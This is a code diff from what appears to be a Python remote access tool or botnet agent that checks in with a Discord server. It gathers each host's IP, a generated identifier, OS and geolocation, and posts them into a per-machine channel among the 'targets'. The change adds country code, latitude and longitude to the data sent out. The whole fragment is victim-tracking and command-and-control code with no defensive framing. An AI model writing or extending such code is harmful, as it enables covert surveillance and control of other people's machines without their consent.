@@ -27,7 +27,7 @@ def main():
     load_dotenv() #take enviroment variables from file .env
     ip = get_ip()
     identifier = generate_uuid()
-    country, city = get_location(ip)
+    country, city, countryCode, lat, lon = get_location(ip)
     threads = []
 
     # Guild, Bot Token input
@@ -45,7 +45,10 @@ def main():
         targets_identifiers = list(map(lambda target: json.loads(target)['identifier'], targets))
 
         if identifier not in targets_identifiers:
-            channel_name = await guild.create_text_channel(identifier, topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()}")
+            channel_name = await guild.create_text_channel(
+                identifier,
+                topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()} | COUNTRY CODE: {countryCode} | LAT: {lat} | LON: {lon}"
+            )
             print(f"Created new channel: {channel_name}")
 
         ping.start(bot)
